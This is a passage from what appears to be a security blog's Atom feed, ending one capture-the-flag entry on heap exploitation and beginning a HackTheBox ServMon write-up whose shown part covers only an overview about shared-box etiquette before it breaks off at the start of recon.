+&lt;p&gt;&lt;a name=&quot;[3]&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=43ewpRBIRgA&quot;&gt;RCE via tcache poisoning&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">One of those boxes where every step was very hard for me. It took me weeks and some nudges to complete but it taught me a lot!</summary></entry><entry><title type="html">Write-up: HackThebox - ServMon</title><link href="https://vpm.rocks/boxes/ServMon/" rel="alternate" type="text/html" title="Write-up: HackThebox - ServMon" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>https://vpm.rocks/boxes/ServMon</id><content type="html" xml:base="https://vpm.rocks/boxes/ServMon/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;This is an interesting box as it has gotten a lot of heat - mostly due to the steps required for root - and I can see why: The web interface might be slowish and buggy under load but also people can mess with each other - pushing the frustration. As this includes overwriting others’ files I think this box teaches what I call &lt;em&gt;gentleman behaviour&lt;/em&gt;. Try to not mess with other peoples stuff when working on the same box.&lt;/p&gt;
 &lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
 &lt;p&gt;A quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan reveals&lt;/p&gt;
